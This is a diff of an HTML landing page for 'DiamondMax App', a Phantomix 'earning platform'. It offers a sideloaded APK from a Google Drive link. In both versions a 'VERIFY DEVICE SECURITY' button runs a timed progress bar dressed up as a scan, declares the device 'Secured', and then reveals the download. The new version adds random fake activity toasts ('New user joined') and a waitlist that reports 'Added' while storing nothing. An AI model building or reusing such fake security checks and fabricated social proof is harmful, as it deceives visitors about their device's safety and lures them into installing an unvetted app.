@@ -1,823 +1,327 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Phantomix | DiamondMax</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phantomix | DiamondMax</title>
 
-    <style>
-        #matrix {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-        #user-email {
-            width: 60%;
-            max-width: 300px;
-            padding: 12px;
-            background-color: #1a1a1a;
-            border: 2px solid #333;
-            color: #00ffff;
-            font-size: 16px;
-            border-radius: 5px;
-            text-align: center;
-            outline: none;
-            transition: 0.3s;
-        }
-        #user-email:focus {
-            border-color: #00ffff;
-            box-shadow: 0px 0px 10px #00ffff;
-        }
-        body {
-            background-color: #0d0d0d;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            margin: 0;
-            overflow-x: hidden;
-        }
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
-        h1 { color: #00ffff; letter-spacing: 2px; }
-        h2 { color: #b026ff; }
-        p { color: #a0a0a0; font-size: 18px; }
+<style>
+body{
+margin:0;
+font-family:Segoe UI, sans-serif;
+background:#0d0d0d;
+color:#fff;
+text-align:center;
+overflow-x:hidden;
+}
 
-        .download-btn {
-            display: inline-block;
-            background-color: #b026ff;
-            color: white;
-            padding: 15px 40px;
-            text-decoration: none;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 8px;
-            margin-top: 25px;
-            margin-bottom: 30px;
-            border: 2px solid #b026ff;
-            transition: 0.3s;
-            cursor: pointer;
-        }
+/* MATRIX */
+canvas{
+position:fixed;
+top:0;
+left:0;
+z-index:-1;
+}
 
-        .download-btn:hover {
-            background-color: transparent;
-            color: #b026ff;
-            box-shadow: 0px 0px 15px #b026ff;
-        }
-        
-        ul {
-            list-style-type: none;
-            padding: 0;
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #00ffff;
-        }
-        li { margin-bottom: 10px; }
+/* POPUP */
+#popup{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.75);
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:99999;
+}
+.box{
+background:#111;
+padding:25px;
+border-radius:15px;
+width:300px;
+box-shadow:0 0 25px rgba(0,255,255,0.2);
+}
 
-        /* --- Professional Social Icons CSS (Colorful By Default) --- */
-        .social-container {
-            margin-top: 20px;
-            margin-bottom: 50px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-        .social-icon {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 50px;
-            height: 50px;
-            background-color: #1a1a1a;
-            border-radius: 50%;
-            text-decoration: none;
-            font-size: 24px;
-            transition: all 0.4s ease;
-        }
+/* LOADER */
+#loader{
+position:fixed;
+inset:0;
+background:#050505;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:99999;
+}
+#loader-bar{
+width:220px;
+height:10px;
+background:#222;
+border-radius:10px;
+overflow:hidden;
+margin-top:10px;
+}
+#loader-bar div{
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#00ffff,#b026ff);
+animation:load 3s forwards;
+}
+@keyframes load{to{width:100%}}
 
-        /* Default Colors */
-        .social-icon.instagram { color: #E1306C; border: 2px solid #E1306C; }
-        .social-icon.whatsapp { color: #25D366; border: 2px solid #25D366; }
-        .social-icon.youtube { color: #FF0000; border: 2px solid #FF0000; }
-        .social-icon.telegram { color: #0088cc; border: 2px solid #0088cc; }
+/* BUTTON */
+.btn{
+background:#b026ff;
+padding:12px 25px;
+border:none;
+color:#fff;
+border-radius:10px;
+cursor:pointer;
+margin:8px;
+font-weight:bold;
+transition:0.3s;
+}
+.btn:hover{opacity:0.8; transform:scale(1.05);}
 
-        /* Hover Glow Effects */
-        .social-icon:hover {
-            transform: translateY(-5px);
-        }
-        .social-icon.instagram:hover {
-            box-shadow: 0px 0px 15px #E1306C;
-            background-color: rgba(225, 48, 108, 0.1);
-        }
-        .social-icon.whatsapp:hover {
-            box-shadow: 0px 0px 15px #25D366;
-            background-color: rgba(37, 211, 102, 0.1);
-        }
-        .social-icon.youtube:hover {
-            box-shadow: 0px 0px 15px #FF0000;
-            background-color: rgba(255, 0, 0, 0.1);
-        }
-        .social-icon.telegram:hover {
-            box-shadow: 0px 0px 15px #0088cc;
-            background-color: rgba(0, 136, 204, 0.1);
-        }
+/* VERIFY */
+#progress{
+width:80%;
+height:15px;
+background:#222;
+margin:15px auto;
+border-radius:10px;
+overflow:hidden;
+display:none;
+}
+#bar{
+height:100%;
+width:0%;
+background:#00ffff;
+}
 
-        @media (max-width: 768px) {
-            body { padding-top: 20px; }
-            h1 { font-size: 28px; }
-            h2 { font-size: 22px; }
-            p { font-size: 16px; padding: 0px 15px; }
-            .download-btn { width: 80%; padding: 12px 0px; font-size: 18px; }
-            .social-icon { width: 45px; height: 45px; font-size: 20px; }
-        }
-    </style>
-    
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Person",
-      "name": "Shrikant Prajapati",
-      "url": "https://phantomix-sp.github.io/diamondmax-app/",
-      "jobTitle": "Founder & CEO",
-      "worksFor": {
-        "@type": "Organization",
-        "name": "Phantomix"
-      },
-      "alumniOf": {
-        "@type": "CollegeOrUniversity",
-        "name": "GLA University"
-      },
-      "sameAs": [
-        "https://www.youtube.com/@Phantomix_SP",
-        "https://whatsapp.com/channel/0029VaAQ8ww7dmei9QiQVd2m",
-        "https://medium.com/@gk2929913/why-i-paused-my-first-startup-at-17-to-learn-the-basics-of-coding-beb699e86fa9",
-        "https://instagram.com/shrikantxprajapati"
-      ]
-    }
-    </script>
+/* TOAST */
+#toast{
+position:fixed;
+top:20px;
+right:20px;
+background:#111;
+border:1px solid #00ffff;
+padding:12px 15px;
+border-radius:10px;
+transform:translateX(120%);
+opacity:0;
+transition:0.5s;
+z-index:9999;
+min-width:200px;
+}
+
+/* SOCIAL */
+.social a{
+color:#00ffff;
+margin:10px;
+font-size:24px;
+display:inline-block;
+transition:0.3s;
+}
+.social a:hover{transform:scale(1.2);}
+
+/* COUNTDOWN */
+#timer{
+font-size:20px;
+font-weight:bold;
+color:#00ffff;
+margin:10px;
+}
+
+/* INPUT */
+input{
+padding:10px;
+border-radius:8px;
+border:none;
+outline:none;
+width:200px;
+text-align:center;
+}
+</style>
 </head>
+
 <body>
 
-    <canvas id="matrix"></canvas>
-
-    <img src="logo.png" alt="Phantomix Logo" style="width: 150px; margin-bottom: 10px; border-radius: 50%; box-shadow: 0px 0px 20px #00ffff;">
-    
-    <h1>PHANTOMIX SYSTEM</h1>
-    <p>Secure. Fast. Reliable.</p>
-    
-    <hr style="border-color: #333; width: 50%;">
-    
-    <h2>💎 DiamondMax App</h2>
-    <p>India's upcoming premium earning platform.</p>
-
-    <button id="verify-btn" class="download-btn" onclick="startSecurityCheck()">
-        VERIFY DEVICE SECURITY
-    </button>
-    
-    <p id="status-message" style="font-size: 20px; font-weight: bold;"></p>
-
-    <div id="progress-container" style="width: 80%; background-color: #333; height: 20px; border-radius: 10px; margin: 20px auto; display: none; border: 1px solid #00ffff;">
-        <div id="progress-bar" style="width: 0%; background-color: #00ffff; height: 100%; border-radius: 10px; box-shadow: 0px 0px 10px #00ffff; transition: width 0.1s;"></div>
-    </div>
-
-    <a href="https://drive.google.com/uc?export=download&id=1y2a2aQEdEZ7bPruQACBpnLKxqVoradR3" id="real-download-btn" class="download-btn" style="display: none; background-color: #00ffff; color: #000; border-color: #00ffff;">
-        DOWNLOAD APK NOW
-    </a>
-
-    <h3>Core Features:</h3>
-    <ul>
-        <li>⚡ Instant Withdrawals</li>
-        <li>🛡️ High-End Security</li>
-        <li>🕹️ Next-Gen UI Experience</li>
-    </ul>
-
-    <hr style="border-color: #333; width: 50%; margin-top: 40px;">
-    
-    <div id="waitlist-box" style="margin-top: 30px; margin-bottom: 20px;">
-        <h3 style="color: #00ffff;">🔥 Join VIP Waitlist</h3>
-        <p>Get early access to DiamondMax before the world does.</p>
-        
-        <input type="email" id="user-email" placeholder="Enter your email ID..." required>
-        <br>
-        <button class="download-btn" onclick="saveEmail()" style="font-size: 16px; padding: 10px 30px; margin-top: 15px;">
-            JOIN THE WAITLIST
-        </button>
-        
-        <p id="waitlist-status" style="color: #00ff00; font-weight: bold; display: none; margin-top: 15px;"></p>
-    </div>
-
-    <h3 style="color: #b026ff; margin-top: 10px;">Connect With Us</h3>
-    <div class="social-container">
-        <a href="https://instagram.com/shrikantxprajapati" target="_blank" class="social-icon instagram"><i class="fa-brands fa-instagram"></i></a>
-        <a href="https://whatsapp.com/channel/0029VaAQ8ww7dmei9QiQVd2m" target="_blank" class="social-icon whatsapp"><i class="fa-brands fa-whatsapp"></i></a>
-        <a href="https://www.youtube.com/@Phantomix_SP" target="_blank" class="social-icon youtube"><i class="fa-brands fa-youtube"></i></a>
-        <a href="YOUR_TELEGRAM_LINK_HERE" target="_blank" class="social-icon telegram"><i class="fa-brands fa-telegram"></i></a>
-    </div>
-
-    <script>
-        function startSecurityCheck() {
-            document.getElementById("verify-btn").style.display = "none";
-            document.getElementById("progress-container").style.display = "block";
-            
-            let statusText = document.getElementById("status-message");
-            let progressBar = document.getElementById("progress-bar");
-            let width = 0;
-            
-            let interval = setInterval(function() {
-                if (width >= 100) {
-                    clearInterval(interval); 
-                    statusText.innerHTML = "✅ Device Secured. Access Granted!";
-                    statusText.style.color = "#00ff00";
-                    document.getElementById("real-download-btn").style.display = "inline-block";
-                } else {
-                    width++; 
-                    progressBar.style.width = width + "%";
-                    statusText.innerHTML = "Scanning Device: " + width + "%";
-                    statusText.style.color = "yellow";
-                }
-            }, 50); 
-        }
-
-        function saveEmail() {
-            let emailBox = document.getElementById("user-email");
-            let userEmailData = emailBox.value;
-            let statusText = document.getElementById("waitlist-status");
-            let button = event.target;
-            if (userEmailData === "" || userEmailData.includes("@") === false) {
-                statusText.innerHTML = "⚠️ Error: Invalid Email Format!";
-                statusText.style.color = "red";
-                statusText.style.display = "block";
-                return;
-            } 
-
-            statusText.innerHTML = "🔄 Transmitting Data to Phantomix Servers...";
-            statusText.style.color = "yellow";
-            statusText.style.display = "block";
-            button.innerHTML = "WAIT..."; 
-            let formspreeURL = "https://formspree.io/f/mlgokwlr";
-
-            fetch(formspreeURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
-                body: JSON.stringify({ 
-                    email: userEmailData, 
-                    source: "DiamondMax Official Waitlist" 
-                })
-            })
-            .then(response => {
-                if(response.ok) {
-                    emailBox.style.display = "none";
-                    button.style.display = "none"; 
-                    statusText.innerHTML = "🎉 Target Locked! " + userEmailData + " is securely added to the Waitlist.";
-                    statusText.style.color = "#00ff00"; 
-                } else {
-                    statusText.innerHTML = "⚠️ Server Connection Failed!";
-                    statusText.style.color = "red";
-                    button.innerHTML = "JOIN THE WAITLIST";
-                }
-            })
-            .catch(error => {
-                statusText.innerHTML = "⚠️ Network Error! Check your internet.";
-                statusText.style.color = "red";
-                button.innerHTML = "JOIN THE WAITLIST";
-            });
-        }
-
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
-        const fontSize = 16;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        
-        for (let i = 0; i < columns; i++) {
-            drops[i] = 1;
-        }
-        
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = "#0f0";
-            ctx.font = fontSize + "px arial";
-            
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.97) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 33);
-        
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-    </script>
-    <!-- ===== PROFESSIONAL SUPPORT POPUP ===== -->
-<div id="support-popup">
-    <div class="popup-box">
-        
-        <button class="close-popup" onclick="closePopup()">
-            <i class="fa-solid fa-xmark"></i>
-        </button>
-
-        <img src="logo.png" alt="Phantomix Logo" class="popup-logo">
-
-        <h2>Welcome to Phantomix</h2>
-        <p class="popup-text">
-            Need help or want to stay connected with the Phantomix community?
-        </p>
-
-        <div class="support-mail-box">
-            <i class="fa-solid fa-envelope"></i>
-            <a href="mailto:phantomix.00@gmail.com">
-                phantomix.00@gmail.com
-            </a>
-        </div>
-
-        <div class="popup-socials">
-            <a href="https://instagram.com/shrikantxprajapati" target="_blank" class="popup-social instagram">
-                <i class="fa-brands fa-instagram"></i>
-            </a>
-
-            <a href="https://www.youtube.com/@Phantomix_SP" target="_blank" class="popup-social youtube">
-                <i class="fa-brands fa-youtube"></i>
-            </a>
-
-            <a href="https://whatsapp.com/channel/0029VaAQ8ww7dmei9QiQVd2m" target="_blank" class="popup-social whatsapp">
-                <i class="fa-brands fa-whatsapp"></i>
-            </a>
-
-            <a href="YOUR_TELEGRAM_LINK_HERE" target="_blank" class="popup-social telegram">
-                <i class="fa-brands fa-telegram"></i>
-            </a>
-        </div>
-
-        <button class="enter-btn" onclick="closePopup()">
-            ENTER SYSTEM
-        </button>
-
-    </div>
+<!-- POPUP -->
+<div id="popup">
+<div class="box">
+<h2>Welcome to Phantomix</h2>
+<p>Enter System</p>
+<button class="btn" onclick="closePopup()">ENTER</button>
+</div>
 </div>
 
-<style>
-/* ===== POPUP BACKGROUND ===== */
-#support-popup{
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.75);
-    backdrop-filter: blur(8px);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 99999;
-    animation: fadeIn 0.5s ease;
-}
-
-/* ===== POPUP BOX ===== */
-.popup-box{
-    width: 90%;
-    max-width: 400px;
-    background: rgba(20,20,20,0.85);
-    border: 1px solid rgba(0,255,255,0.3);
-    border-radius: 20px;
-    padding: 30px 25px;
-    text-align: center;
-    position: relative;
-    box-shadow: 0 0 30px rgba(0,255,255,0.2);
-    animation: popupAnim 0.5s ease;
-}
-
-/* ===== LOGO ===== */
-.popup-logo{
-    width: 90px;
-    height: 90px;
-    border-radius: 50%;
-    margin-bottom: 15px;
-    box-shadow: 0 0 20px #00ffff;
-}
-
-/* ===== TITLE ===== */
-.popup-box h2{
-    color: #00ffff;
-    margin-bottom: 10px;
-    letter-spacing: 1px;
-}
-
-/* ===== TEXT ===== */
-.popup-text{
-    color: #cfcfcf;
-    font-size: 15px;
-    margin-bottom: 25px;
-}
-
-/* ===== EMAIL BOX ===== */
-.support-mail-box{
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(0,255,255,0.2);
-    border-radius: 12px;
-    padding: 12px;
-    margin-bottom: 25px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-}
-
-.support-mail-box i{
-    color: #00ffff;
-    font-size: 18px;
-}
-
-.support-mail-box a{
-    color: white;
-    text-decoration: none;
-    font-size: 15px;
-}
-
-/* ===== SOCIAL ICONS ===== */
-.popup-socials{
-    display: flex;
-    justify-content: center;
-    gap: 15px;
-    margin-bottom: 25px;
-}
-
-.popup-social{
-    width: 48px;
-    height: 48px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 22px;
-    transition: 0.3s;
-    text-decoration: none;
-}
-
-/* COLORS */
-.popup-social.instagram{
-    color: #E1306C;
-    border: 2px solid #E1306C;
-}
-
-.popup-social.youtube{
-    color: #FF0000;
-    border: 2px solid #FF0000;
-}
-
-.popup-social.whatsapp{
-    color: #25D366;
-    border: 2px solid #25D366;
-}
-
-.popup-social.telegram{
-    color: #0088cc;
-    border: 2px solid #0088cc;
-}
-
-/* HOVER */
-.popup-social:hover{
-    transform: translateY(-5px) scale(1.08);
-}
-
-.popup-social.instagram:hover{
-    box-shadow: 0 0 15px #E1306C;
-}
-
-.popup-social.youtube:hover{
-    box-shadow: 0 0 15px #FF0000;
-}
-
-.popup-social.whatsapp:hover{
-    box-shadow: 0 0 15px #25D366;
-}
-
-.popup-social.telegram:hover{
-    box-shadow: 0 0 15px #0088cc;
-}
-
-/* ===== ENTER BUTTON ===== */
-.enter-btn{
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(45deg,#00ffff,#b026ff);
-    color: white;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-.enter-btn:hover{
-    transform: scale(1.03);
-    box-shadow: 0 0 20px #00ffff;
-}
-
-/* ===== CLOSE BUTTON ===== */
-.close-popup{
-    position: absolute;
-    top: 12px;
-    right: 12px;
-    background: transparent;
-    border: none;
-    color: white;
-    font-size: 20px;
-    cursor: pointer;
-}
-
-/* ===== ANIMATIONS ===== */
-@keyframes popupAnim{
-    from{
-        opacity: 0;
-        transform: scale(0.8);
-    }
-    to{
-        opacity: 1;
-        transform: scale(1);
-    }
-}
-
-@keyframes fadeIn{
-    from{
-        opacity: 0;
-    }
-    to{
-        opacity: 1;
-    }
-}
-</style>
-
-<script>
-function closePopup(){
-    document.getElementById("support-popup").style.display = "none";
-}
-</script><!-- ===== PROFESSIONAL SUPPORT POPUP ===== -->
-<div id="support-popup">
-    <div class="popup-box">
-        
-        <button class="close-popup" onclick="closePopup()">
-            <i class="fa-solid fa-xmark"></i>
-        </button>
-
-        <img src="logo.png" alt="Phantomix Logo" class="popup-logo">
-
-        <h2>Welcome to Phantomix</h2>
-        <p class="popup-text">
-            Need help or want to stay connected with the Phantomix community?
-        </p>
-
-        <div class="support-mail-box">
-            <i class="fa-solid fa-envelope"></i>
-            <a href="mailto:phantomix.00@gmail.com">
-                phantomix.00@gmail.com
-            </a>
-        </div>
-
-        <div class="popup-socials">
-            <a href="https://instagram.com/shrikantxprajapati" target="_blank" class="popup-social instagram">
-                <i class="fa-brands fa-instagram"></i>
-            </a>
-
-            <a href="https://www.youtube.com/@Phantomix_SP" target="_blank" class="popup-social youtube">
-                <i class="fa-brands fa-youtube"></i>
-            </a>
-
-            <a href="https://whatsapp.com/channel/0029VaAQ8ww7dmei9QiQVd2m" target="_blank" class="popup-social whatsapp">
-                <i class="fa-brands fa-whatsapp"></i>
-            </a>
-
-            <a href="YOUR_TELEGRAM_LINK_HERE" target="_blank" class="popup-social telegram">
-                <i class="fa-brands fa-telegram"></i>
-            </a>
-        </div>
-
-        <button class="enter-btn" onclick="closePopup()">
-            ENTER SYSTEM
-        </button>
-
-    </div>
+<!-- LOADER -->
+<div id="loader">
+<h2>PHANTOMIX SYSTEM</h2>
+<div id="loader-bar"><div></div></div>
 </div>
 
-<style>
-/* ===== POPUP BACKGROUND ===== */
-#support-popup{
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.75);
-    backdrop-filter: blur(8px);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 99999;
-    animation: fadeIn 0.5s ease;
-}
+<canvas id="matrix"></canvas>
 
-/* ===== POPUP BOX ===== */
-.popup-box{
-    width: 90%;
-    max-width: 400px;
-    background: rgba(20,20,20,0.85);
-    border: 1px solid rgba(0,255,255,0.3);
-    border-radius: 20px;
-    padding: 30px 25px;
-    text-align: center;
-    position: relative;
-    box-shadow: 0 0 30px rgba(0,255,255,0.2);
-    animation: popupAnim 0.5s ease;
-}
+<!-- LOGO RESTORED -->
+<img src="logo.png" width="120" style="border-radius:50%;box-shadow:0 0 20px #00ffff;">
 
-/* ===== LOGO ===== */
-.popup-logo{
-    width: 90px;
-    height: 90px;
-    border-radius: 50%;
-    margin-bottom: 15px;
-    box-shadow: 0 0 20px #00ffff;
-}
+<h1>PHANTOMIX SYSTEM</h1>
+<p>Secure • Fast • Reliable</p>
 
-/* ===== TITLE ===== */
-.popup-box h2{
-    color: #00ffff;
-    margin-bottom: 10px;
-    letter-spacing: 1px;
-}
+<h2>💎 DiamondMax App</h2>
 
-/* ===== TEXT ===== */
-.popup-text{
-    color: #cfcfcf;
-    font-size: 15px;
-    margin-bottom: 25px;
-}
+<h3>🚀 Launch Countdown</h3>
+<p id="timer">Loading...</p>
 
-/* ===== EMAIL BOX ===== */
-.support-mail-box{
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(0,255,255,0.2);
-    border-radius: 12px;
-    padding: 12px;
-    margin-bottom: 25px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-}
+<button class="btn" onclick="verify()">VERIFY DEVICE SECURITY</button>
 
-.support-mail-box i{
-    color: #00ffff;
-    font-size: 18px;
-}
+<div id="progress"><div id="bar"></div></div>
 
-.support-mail-box a{
-    color: white;
-    text-decoration: none;
-    font-size: 15px;
-}
+<p id="status"></p>
 
-/* ===== SOCIAL ICONS ===== */
-.popup-socials{
-    display: flex;
-    justify-content: center;
-    gap: 15px;
-    margin-bottom: 25px;
-}
+<a id="apk" class="btn" style="display:none"
+href="https://drive.google.com/uc?export=download&id=1y2a2aQEdEZ7bPruQACBpnLKxqVoradR3">
+DOWNLOAD APK
+</a>
 
-.popup-social{
-    width: 48px;
-    height: 48px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 22px;
-    transition: 0.3s;
-    text-decoration: none;
-}
+<br><br>
 
-/* COLORS */
-.popup-social.instagram{
-    color: #E1306C;
-    border: 2px solid #E1306C;
-}
+<h3>Join Waitlist</h3>
+<input id="email" placeholder="Enter email">
+<br>
+<button class="btn" onclick="save()">JOIN</button>
 
-.popup-social.youtube{
-    color: #FF0000;
-    border: 2px solid #FF0000;
-}
+<p id="msg"></p>
 
-.popup-social.whatsapp{
-    color: #25D366;
-    border: 2px solid #25D366;
-}
+<!-- SOCIAL RESTORED -->
+<div class="social">
+<a href="https://instagram.com/shrikantxprajapati"><i class="fab fa-instagram"></i></a>
+<a href="https://www.youtube.com/@Phantomix_SP"><i class="fab fa-youtube"></i></a>
+<a href="https://whatsapp.com/channel/0029VaAQ8ww7dmei9QiQVd2m"><i class="fab fa-whatsapp"></i></a>
+<a href="https://t.me/diamondmax_india"><i class="fab fa-telegram"></i></a>
+</div>
 
-.popup-social.telegram{
-    color: #0088cc;
-    border: 2px solid #0088cc;
-}
-
-/* HOVER */
-.popup-social:hover{
-    transform: translateY(-5px) scale(1.08);
-}
-
-.popup-social.instagram:hover{
-    box-shadow: 0 0 15px #E1306C;
-}
-
-.popup-social.youtube:hover{
-    box-shadow: 0 0 15px #FF0000;
-}
-
-.popup-social.whatsapp:hover{
-    box-shadow: 0 0 15px #25D366;
-}
-
-.popup-social.telegram:hover{
-    box-shadow: 0 0 15px #0088cc;
-}
-
-/* ===== ENTER BUTTON ===== */
-.enter-btn{
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(45deg,#00ffff,#b026ff);
-    color: white;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-.enter-btn:hover{
-    transform: scale(1.03);
-    box-shadow: 0 0 20px #00ffff;
-}
-
-/* ===== CLOSE BUTTON ===== */
-.close-popup{
-    position: absolute;
-    top: 12px;
-    right: 12px;
-    background: transparent;
-    border: none;
-    color: white;
-    font-size: 20px;
-    cursor: pointer;
-}
-
-/* ===== ANIMATIONS ===== */
-@keyframes popupAnim{
-    from{
-        opacity: 0;
-        transform: scale(0.8);
-    }
-    to{
-        opacity: 1;
-        transform: scale(1);
-    }
-}
-
-@keyframes fadeIn{
-    from{
-        opacity: 0;
-    }
-    to{
-        opacity: 1;
-    }
-}
-</style>
+<div id="toast"></div>
 
 <script>
+
+/* POPUP */
 function closePopup(){
-    document.getElementById("support-popup").style.display = "none";
+document.getElementById("popup").style.display="none";
 }
+
+/* LOADER */
+setTimeout(()=>document.getElementById("loader").style.display="none",3000);
+
+/* VERIFY FIXED */
+function verify(){
+let bar=document.getElementById("bar");
+let box=document.getElementById("progress");
+let status=document.getElementById("status");
+let apk=document.getElementById("apk");
+
+box.style.display="block";
+let w=0;
+
+let t=setInterval(()=>{
+w++;
+bar.style.width=w+"%";
+status.innerText="Scanning "+w+"%";
+
+if(w>=100){
+clearInterval(t);
+status.innerText="Device Secured ✅";
+apk.style.display="inline-block";
+}
+},30);
+}
+
+/* EMAIL */
+function save(){
+let email=document.getElementById("email").value;
+if(!email.includes("@")){
+showToast("Invalid Email ❌");
+return;
+}
+document.getElementById("msg").innerText="Added ✅";
+}
+
+/* TOAST FIX */
+function showToast(text){
+let t=document.getElementById("toast");
+t.innerText=text;
+t.style.opacity="1";
+t.style.transform="translateX(0)";
+setTimeout(()=>{
+t.style.opacity="0";
+t.style.transform="translateX(120%)";
+},2500);
+}
+
+/* LIVE TOAST SAFE */
+setInterval(()=>{
+let msgs=[
+"🔥 New user joined",
+"💎 VIP unlocked",
+"🚀 Device verified",
+"⚡ System active"
+];
+showToast(msgs[Math.floor(Math.random()*msgs.length)]);
+},6000);
+
+/* CLEAN COUNTDOWN (REAL FUTURE DATE) */
+let launch = new Date("2028-01-01T00:00:00").getTime();
+
+setInterval(()=>{
+let now = new Date().getTime();
+let diff = launch - now;
+
+let d = Math.floor(diff/(1000*60*60*24));
+let h = Math.floor((diff%(1000*60*60*24))/(1000*60*60));
+let m = Math.floor((diff%(1000*60*60))/(1000*60));
+let s = Math.floor((diff%(1000*60))/1000);
+
+if(diff<=0){
+document.getElementById("timer").innerText="🚀 LAUNCHED";
+return;
+}
+
+document.getElementById("timer").innerText =
+d+"d "+h+"h "+m+"m "+s+"s";
+},1000);
+
+/* MATRIX FIXED */
+let c=document.getElementById("matrix");
+let ctx=c.getContext("2d");
+
+c.width=window.innerWidth;
+c.height=window.innerHeight;
+
+let letters="01ABCXYZ#$%";
+let font=14;
+let cols=Math.floor(c.width/font);
+let drops=Array(cols).fill(1);
+
+function draw(){
+ctx.fillStyle="rgba(0,0,0,0.05)";
+ctx.fillRect(0,0,c.width,c.height);
+ctx.fillStyle="#0f0";
+ctx.font=font+"px monospace";
+
+for(let i=0;i<drops.length;i++){
+let text=letters[Math.floor(Math.random()*letters.length)];
+ctx.fillText(text,i*font,drops[i]*font);
+
+if(drops[i]*font>c.height && Math.random()>0.95)drops[i]=0;
+drops[i]++;
+}
+}
+setInterval(draw,33);
+
 </script>
+
 </body>
 </html>
